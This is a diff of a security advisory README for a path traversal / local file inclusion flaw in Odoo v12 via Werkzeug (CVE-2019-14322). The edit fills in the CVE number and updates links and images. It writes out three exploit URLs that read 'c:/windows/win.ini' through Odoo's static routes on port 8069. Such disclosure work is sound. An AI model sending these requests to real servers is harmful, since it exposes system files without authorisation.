@@ -3,9 +3,15 @@
 
 [https://www.odoo.com/security-report](https://www.odoo.com/security-report)
 
-![alt tag](https://emreovunc.com/images/odoo-emreovunc-security.png)
+[https://palletsprojects.com/p/werkzeug/](https://palletsprojects.com/p/werkzeug/)
 
-# CVE-2019-XXXXX
+
+![Odoo](https://emreovunc.com/images/odoo-emreovunc-security.png)
+
+![Werkzeug](https://emreovunc.com/blog/en/werkzeug-0-15-5.png)
+
+
+# CVE-2019-14322
 To exploit vulnerability, someone could use 'http://[HOST]:8069/base_import/static/c:/windows/win.ini' request to get some informations from the target.
 
 ```
@@ -20,10 +26,9 @@ Connection: close
 Upgrade-Insecure-Requests: 1
 ```
 
-![alt tag](https://www.emreovunc.com/blog/en/Odoo-v12-LFI-Vulnerability-3.png)
+![alt tag](https://emreovunc.com/blog/en/Odoo-v12-LFI-Vulnerability-3.png)
 
 
-# CVE-2019-XXXXX
 To exploit vulnerability, someone could use 'http://[HOST]:8069/web/static/c:/windows/win.ini' request to get some informations from the target.
 
 ```
@@ -38,9 +43,9 @@ Connection: close
 Upgrade-Insecure-Requests: 1
 ```
 
-![alt tag](https://www.emreovunc.com/blog/en/Odoo-v12-LFI-Vulnerability-1.png)
+![](https://emreovunc.com/blog/en/Odoo-v12-LFI-Vulnerability-1.png)
 
-# CVE-2019-XXXXX
+
 To exploit vulnerability, someone could use 'http://[HOST]:8069/base/static/c:/windows/win.ini' request to get some informations from the target.
 
 ```
@@ -55,4 +60,4 @@ Connection: close
 Upgrade-Insecure-Requests: 1
 ```
 
-![alt tag](https://www.emreovunc.com/blog/en/Odoo-v12-LFI-Vulnerability-2.png)
+![ ](https://emreovunc.com/blog/en/Odoo-v12-LFI-Vulnerability-2.png)
